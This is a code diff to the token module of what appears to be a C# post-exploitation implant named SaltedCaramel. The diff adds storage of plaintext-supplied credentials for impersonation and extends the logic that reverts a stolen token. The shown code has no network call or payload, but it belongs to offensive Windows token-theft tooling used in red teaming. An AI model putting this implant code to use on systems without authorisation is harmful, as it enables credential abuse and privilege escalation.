@@ -1,6 +1,8 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using System.Security;
 using System.Security.Principal;
 
 namespace SaltedCaramel.Tasks
@@ -8,6 +10,7 @@ namespace SaltedCaramel.Tasks
     public class Token
     {
         public static IntPtr stolenHandle;
+        public static KeyValuePair<string, SecureString> Credentials;
 
         public static void Execute(SCTask task)
         {
@@ -25,6 +28,16 @@ namespace SaltedCaramel.Tasks
         {
             string user = task.@params.Split(' ')[0];
             string pass = task.@params.Split(' ')[1];
+
+            // Dumb workaround, but we have to do this to make a SecureString
+            // out of a string
+            SecureString password = new SecureString();
+            foreach (char c in pass)
+            {
+                password.AppendChar(c);
+            }
+
+            Credentials = new KeyValuePair<string, SecureString>(user, password);
         }
 
         public static void StealToken(SCTask task)
@@ -108,12 +121,32 @@ namespace SaltedCaramel.Tasks
                 task.message = e.Message;
             }
         }
+        public static void Revert()
+        {
+            if (stolenHandle != IntPtr.Zero)
+            {
+                Win32.Kernel32.CloseHandle(stolenHandle);
+                stolenHandle = IntPtr.Zero;
+            }
+            else if (Credentials.Key != null)
+            {
+                Credentials = new KeyValuePair<string, SecureString>(null, null);
+            }
+        }
 
         public static void Revert(SCTask task)
         {
-            Win32.Kernel32.CloseHandle(stolenHandle);
-            stolenHandle = IntPtr.Zero;
+            if (stolenHandle != IntPtr.Zero)
+            {
+                Win32.Kernel32.CloseHandle(stolenHandle);
+                stolenHandle = IntPtr.Zero;
+            }
+            else if (Credentials.Key != null)
+            {
+                Credentials = new KeyValuePair<string, SecureString>(null, null);
+            }
             task.status = "complete";
+            task.message = "Reverted to implant primary token.";
         }
     }
 }
